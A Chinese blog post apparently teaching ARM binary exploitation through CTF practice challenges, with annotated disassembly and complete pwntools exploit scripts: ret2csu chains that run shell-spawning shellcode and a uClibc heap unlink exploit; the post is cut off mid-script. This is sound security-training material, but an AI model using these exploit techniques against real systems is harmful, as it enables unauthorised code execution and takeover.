+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400658 ; =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:0000000000400658</span><br><span class="line">.text:0000000000400658 ; Attributes: bp-based frame fpd=0x30</span><br><span class="line">.text:0000000000400658</span><br><span class="line">.text:0000000000400658                 EXPORT fun</span><br><span class="line">.text:0000000000400658 fun                                     ; CODE XREF: main+4C↓p</span><br><span class="line">.text:0000000000400658</span><br><span class="line">.text:0000000000400658 var_30          = -0x30</span><br><span class="line">.text:0000000000400658 var_20          = -0x20</span><br><span class="line">.text:0000000000400658 var_1C          = -0x1C</span><br><span class="line">.text:0000000000400658 var_18          = -0x18</span><br><span class="line">.text:0000000000400658 var_14          = -0x14</span><br><span class="line">.text:0000000000400658 var_10          = -0x10</span><br><span class="line">.text:0000000000400658 var_C           = -0xC</span><br><span class="line">.text:0000000000400658 var_8           = -8</span><br><span class="line">.text:0000000000400658 var_4           = -4</span><br><span class="line">.text:0000000000400658</span><br><span class="line">.text:0000000000400658                 STP             X29, X30, [SP,#var_30]! </span><br><span class="line">; 保存FP(X29)和LR(X30)到栈顶，同时SP -= 0x30</span><br><span class="line">.text:000000000040065C                 MOV             X29, SP; 设置新栈帧基址(X29 = SP)</span><br><span class="line">; 将寄存器参数存入栈帧（ARM64规则：前8个参数用W0-W7传递）</span><br><span class="line">.text:0000000000400660                 STR             W0, [X29,#0x30+var_4] ; 保存参数到栈 [X29-4]</span><br><span class="line">.text:0000000000400664                 STR             W1, [X29,#0x30+var_8]</span><br><span class="line">.text:0000000000400668                 STR             W2, [X29,#0x30+var_C]</span><br><span class="line">.text:000000000040066C                 STR             W3, [X29,#0x30+var_10]</span><br><span class="line">.text:0000000000400670                 STR             W4, [X29,#0x30+var_14]</span><br><span class="line">.text:0000000000400674                 STR             W5, [X29,#0x30+var_18]</span><br><span class="line">.text:0000000000400678                 STR             W6, [X29,#0x30+var_1C]</span><br><span class="line">.text:000000000040067C                 STR             W7, [X29,#0x30+var_20]</span><br><span class="line">.text:0000000000400680                 ADRL            X0, aDDDD ; &quot;%d %d %d %d\n&quot;</span><br><span class="line">; 加载格式字符串地址 &quot;%d %d %d %d\n&quot; 到 X0（参数1）</span><br><span class="line">.text:0000000000400688                 LDR             W4, [X29,#0x30+var_10]; 从栈加载第4个参数到 W4（参数5）</span><br><span class="line">.text:000000000040068C                 LDR             W3, [X29,#0x30+var_C]</span><br><span class="line">.text:0000000000400690                 LDR             W2, [X29,#0x30+var_8]</span><br><span class="line">.text:0000000000400694                 LDR             W1, [X29,#0x30+var_4]</span><br><span class="line">.text:0000000000400698                 BL              printf ; 调用 printf(X0, X1, X2, X3, W4)</span><br><span class="line">; === 函数退出 ===</span><br><span class="line">.text:000000000040069C                 MOV  W0, #1          ; 设置返回值 W0 = 1</span><br><span class="line">.text:00000000004006A0                 LDP  X29, X30, [SP+0x30+var_30],#0x30  ; 恢复FP/LR，同时 SP += 0x30</span><br><span class="line">.text:00000000004006A4                 RET                  ; 返回调用处（跳转到 LR 保存的地址）</span><br><span class="line">.text:00000000004006A4 ; End of function fun</span><br><span class="line">.text:00000000004006A4</span><br></pre></td></tr></table></figure>
+
+<p>ARM64里ADRP寻址，使用ADRP将目标的页地址存入寄存器，然后使用add加上offest，从而获得目标地址</p>
+<p>ARM64新增了ret指令，但是ret并不会从栈里弹出一个数据到pc中。ret指令会将Ir寄存器（X30）的值赋给pc。</p>
+<p>因此，一般函数结尾可以看到这两句，其中X29类似于x86下的rbp。X30是LR寄存器，ret就是将x30的值赋给pc，从而实现返回</p>
+<p><img data-src="/../images/image-20250714210630341.png" alt="image-20250714210630341"></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>在x86下的各种思想，同样使用于arm。</p>
+<p>通过csu控制多个寄存器，并调用对应的函数</p>
+<p>arm下的堆的性质取决于libc，如果是glibc那么以前的手法都是用，如果是其它libc，也可以自行调试，发现性质。</p>
+<table>
+<thead>
+<tr>
+<th>架构</th>
+<th>等价于 ebp&#x2F;rbp 的寄存器</th>
+<th>官方名称&#x2F;常用别名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>arm32 (A32&#x2F;T32)</strong></td>
+<td>R11</td>
+<td>fp (Frame Pointer)</td>
+</tr>
+<tr>
+<td><strong>aarch64 (A64)</strong></td>
+<td>X29</td>
+<td>fp (Frame Pointer)</td>
+</tr>
+</tbody></table>
+<h2 id="例题学习"><a href="#例题学习" class="headerlink" title="例题学习"></a>例题学习</h2><h3 id="root-me-stack-buffer-overflow-basic"><a href="#root-me-stack-buffer-overflow-basic" class="headerlink" title="root_me_stack_buffer_overflow_basic"></a>root_me_stack_buffer_overflow_basic</h3><p>自己整的题，保护：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Arch:       arm-32-little</span><br><span class="line">RELRO:      Full RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX enabled on new kernels</span><br><span class="line">PIE:        No PIE (0x10000)</span><br><span class="line">Stack:      Executable</span><br><span class="line">RWX:        Has RWX segments</span><br><span class="line">FORTIFY:    Enabled</span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>可以注入shellcode到bss段，在跳转过去执行</p>
+<p>反汇编如下，很明显的可以看到scanf没有进行输入限制，存在溢出：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s_1; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// t1</span></span><br><span class="line">  <span class="type">int</span> n15; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">char</span> n121; <span class="comment">// [sp+7h] [bp-A9h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">168</span>]; <span class="comment">// [sp+8h] [bp-A8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  n121 = <span class="number">121</span>;<span class="comment">//&#x27;y&#x27;</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    _printf_chk(<span class="number">1</span>, <span class="string">&quot;Give me data to dump:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">scanf</span>(<span class="string">&quot; %[^\n]s&quot;</span>, s) )  <span class="comment">//scanf()溢出</span></span><br><span class="line">    &#123;</span><br><span class="line">      s_1 = s;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="built_in">strlen</span>(s) &gt; v4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          n15 = v4++ &amp; <span class="number">0xF</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !n15 )</span><br><span class="line">            _printf_chk(<span class="number">1</span>, <span class="string">&quot;%p: &quot;</span>, s_1);</span><br><span class="line">          v5 = (<span class="type">unsigned</span> __int8)*s_1++;</span><br><span class="line">          _printf_chk(<span class="number">1</span>, <span class="string">&quot; %02x&quot;</span>, v5);</span><br><span class="line">          <span class="keyword">if</span> ( n15 != <span class="number">15</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          _printf_chk(<span class="number">1</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) &lt;= v4 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_9:</span><br><span class="line">    _printf_chk(<span class="number">1</span>, <span class="string">&quot;\nDump again (y/n):\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="built_in">scanf</span>(<span class="string">&quot; %c&quot;</span>, &amp;n121) &amp;&amp; (n121 &amp; <span class="number">0xDF</span>) == <span class="number">0x59</span> );</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题的思路是我们通过csu来控制流程，执行函数，如图：</p>
+<img data-src="../images/image-20250715164602158.png" alt="image-20250715164602158" style="zoom:67%;" />
+
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>call (Intel x86)</th>
+<th>BL (ARM 32-bit)</th>
+<th>BLX (ARM 32-bit)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>主要功能</strong></td>
+<td>子程序调用</td>
+<td>子程序调用</td>
+<td>子程序调用并切换状态</td>
+</tr>
+<tr>
+<td><strong>返回地址存储</strong></td>
+<td>压入<strong>栈</strong></td>
+<td>存入<strong>链接寄存器 (LR)</strong></td>
+<td>存入<strong>链接寄存器 (LR)</strong></td>
+</tr>
+<tr>
+<td><strong>指令集切换</strong></td>
+<td>不适用</td>
+<td><strong>否</strong> (保持当前状态)</td>
+<td><strong>是</strong> (根据目标地址的最低位决定)</td>
+</tr>
+<tr>
+<td><strong>典型用途</strong></td>
+<td>所有函数调用</td>
+<td>调用同一指令集的函数</td>
+<td>在 ARM 和 Thumb 代码间互相调用</td>
+</tr>
+</tbody></table>
+<p>但是呢在csu处的前面我们可以发现它是CODE16说明csu处的指令是thumb模式，如下图可说明：</p>
+<img data-src="../images/image-20250715164716861.png" alt="image-20250715164716861" style="zoom:67%;" />
+
+<p>因为csu处是thumb指令所有我们肯定不能直接控制pc到0x10610处调用，而是0x10611后面的那个1并不是地址里面的而是一个标志位（改变CPSR状态寄存器里的T标志位），就是前面那张图片中State bit(工作状态)设置为1</p>
+<p>总体思路：</p>
+<p>最终exp，就是一个ret2csu</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./root_me_stack_buffer_overflow_basic_20210901_115841&#x27;</span>)</span><br><span class="line">scanf_got = elf.got[<span class="string">&#x27;scanf&#x27;</span>]</span><br><span class="line">bss = <span class="number">0x00021008</span> + <span class="number">0x100</span></span><br><span class="line">csu_pop = <span class="number">0x00010610</span></span><br><span class="line">csu_call = <span class="number">0x000105FE</span></span><br><span class="line">sh = process(argv=[<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/arm-linux-gnueabihf&#x27;</span>,<span class="string">&#x27;./root_me_stack_buffer_overflow_basic_20210901_115841&#x27;</span>])</span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;./root_me_stack_buffer_overflow_basic_20210901_115841&#x27;])</span></span><br><span class="line"><span class="comment"># 目标：调用 scanf(format, bss_addr)，其中 format 是我们输入的 shellcode</span></span><br><span class="line"><span class="comment"># scanf 的原型是 scanf(const char *format, ...);</span></span><br><span class="line"><span class="comment"># R0 = format_string_address</span></span><br><span class="line"><span class="comment"># R1 = address_to_write_to</span></span><br><span class="line"><span class="comment"># ... 其他参数================&gt;&gt;&gt; R3(R0,R1...)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 我们需要控制的寄存器：</span></span><br><span class="line"><span class="comment"># R0 -&gt; &quot;我们发送的shellcode&quot; (这比较难直接控制，但 scanf 可以从标准输入读取)</span></span><br><span class="line"><span class="comment"># R1 -&gt; bss (一个可写的内存地址，用来存放 shellcode)</span></span><br><span class="line"><span class="comment"># R7 -&gt; R0 -&gt; 调用 scanf 时，R7 需要是 scanf 的第一个参数。这里利用 R7 来控制 R0。</span></span><br><span class="line"><span class="comment">#       但是 scanf 的第一个参数是格式化字符串，我们希望它能接收任意字符，</span></span><br><span class="line"><span class="comment">#       可以找一个指向类似 &quot;%s&quot; 或能接收输入的地址，或者更巧妙地，利用 scanf 自身特性。</span></span><br><span class="line"><span class="comment">#       这里 exp 的作者选择了一个更简单直接的方式：利用 scanf 的返回值，</span></span><br><span class="line"><span class="comment">#       并构造一个 ROP 链来调用它。</span></span><br><span class="line"><span class="comment">#       不过这里的payload的目的是调用 scanf(0x00010644, bss)。</span></span><br><span class="line"><span class="comment">#       查看 0x00010644 的内容可能是一个格式化字符串。</span></span><br><span class="line"><span class="comment"># R8 -&gt; R1 -&gt; bss (用来存放 shellcode 的地址)</span></span><br><span class="line"><span class="comment"># R9 -&gt; R2 -&gt; 这里用不到第三个参数，设为 0</span></span><br><span class="line"><span class="comment"># R5 -&gt; scanf_got (scanf 函数在 GOT 表中的地址，LDR.W R3, [R5] 会把 scanf 的真实地址加载到 R3)</span></span><br><span class="line"><span class="comment"># R6 -&gt; 1 (用于跳出循环)</span></span><br><span class="line"><span class="comment"># R4 -&gt; 0 (初始值，在 csu_call 中加 1 后会等于 R6，从而跳出循环)</span></span><br><span class="line"><span class="comment"># R3 -&gt; 我们要调用的函数</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xA4</span> + p32(csu_pop + <span class="number">1</span>) <span class="comment">#切换到Thumb模式，bit0 = 1</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#R3</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#R4</span></span><br><span class="line">payload += p32(scanf_got) <span class="comment">#R5</span></span><br><span class="line">payload += p32(<span class="number">1</span>) <span class="comment">#R6</span></span><br><span class="line">payload += p32(<span class="number">0x00010644</span>) <span class="comment">#R7</span></span><br><span class="line">payload += p32(bss) <span class="comment">#R8</span></span><br><span class="line">payload += p32(<span class="number">0</span>) <span class="comment">#R9</span></span><br><span class="line">payload += p32(csu_call + <span class="number">1</span>) <span class="comment">#Thumb模式，bit0 = 1</span></span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">0x7</span></span><br><span class="line">payload += p32(bss) <span class="comment">#执行shellcode</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;dump:&#x27;</span>,payload)</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;Dump again (y/n):&#x27;</span>,<span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="task"><a href="#task" class="headerlink" title="task"></a>task</h3><p>64位arm的ret2csu</p>
+<p>程序源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> name[<span class="number">0x60</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fun</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;what do you want to say:&quot;</span>);</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">        read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;welcome to haivk&#x27;s class&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;what is your name:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>,name,<span class="number">0x60</span>);</span><br><span class="line">        fun();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>思路（根据前面arm64知识中的栈结构可知，我们溢出只能修改调用函数的返回地址）：</p>
+<ol>
+<li>第一次输入放入shellcode和mprotect()的地址</li>
+<li>第二次输入栈溢出，布局寄存器的值</li>
+<li>getshell</li>
+</ol>
+<p><img data-src="/../images/image-20250716181619125.png" alt="image-20250716181619125"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-aarch64&#x27;,&#x27;./task&#x27;])</span></span><br><span class="line">sh = process(argv=[<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;./task&#x27;</span>])</span><br><span class="line">bss = <span class="number">0x0000000000490440</span></span><br><span class="line">read_addr = <span class="number">0x0000000000416930</span></span><br><span class="line">mprotect_addr = <span class="number">0x0000000000417370</span></span><br><span class="line">csu_ld = <span class="number">0x0000000000400DC4</span></span><br><span class="line">csu_call = <span class="number">0x0000000000400DA4</span></span><br><span class="line"></span><br><span class="line">payload =  p64(mprotect_addr) + asm(shellcraft.sh())</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;name:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(csu_ld)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(csu_call) <span class="comment">#x29 x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(bss) <span class="comment">#x19 x20</span></span><br><span class="line">payload += p64(<span class="number">0x60</span>) + p64(<span class="number">0x7</span>) <span class="comment">#x21 x22</span></span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(bss) <span class="comment">#x23 x24</span></span><br><span class="line"><span class="comment">#x24(x20,x21,x22) == mprotect(bss, 0x60, 7) == x3(w0,x1,x2)</span></span><br><span class="line"><span class="comment">#x29 x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(bss + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;say:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="pwnme"><a href="#pwnme" class="headerlink" title="pwnme"></a>pwnme</h3><p>arm的堆题</p>
+<p>核心就是看装载的libc的是哪种，若是glibc那就正常打，还有其它的libc如uClibc它和glibc内存分配规则一样，还有其他的就根据libc的chunk分配规则来做题</p>
+<p>下面是一道arm 堆题的exp，漏洞是堆溢出，手法：unlink，总统看上去和glibc的脚本一样</p>
+<p>所以arm的堆题就是换汤不换药，arm架构主要还是栈的问题</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(argv=[&#x27;qemu-arm&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;-L&#x27;,&#x27;./&#x27;,&#x27;./pwnme&#x27;])</span></span><br><span class="line">sh = process(argv=[<span class="string">&#x27;qemu-arm&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;./&#x27;</span>,<span class="string">&#x27;./pwnme&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libuClibc-1.0.34.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;Length:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">b&#x27;Tag:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;Length:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">b&#x27;Tag:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;Tag:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exit</span>():</span><br><span class="line">   sh.sendlineafter(<span class="string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x80</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">heap_ptr0_addr = <span class="number">0x0002106C</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(<span class="number">0x81</span>)</span><br><span class="line">payload += p32(heap_ptr0_addr-<span class="number">0xC</span>) + p32(heap_ptr0_addr-<span class="number">0x8</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(<span class="number">0x80</span>) + p32(<span class="number">0x88</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x88</span>,payload)</span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,p64(<span class="number">0</span>) + p32(<span class="number">0x8</span>) + p32(puts_got) + p32(<span class="number">0x8</span>) + p32(free_got) + p32(<span class="number">0x8</span>) + p32(<span class="number">0x00021068</span>))</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;0 : &#x27;</span>)</span><br><span class="line">uclibc_base = u32(sh.recv(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = uclibc_base + libc.sym[<span 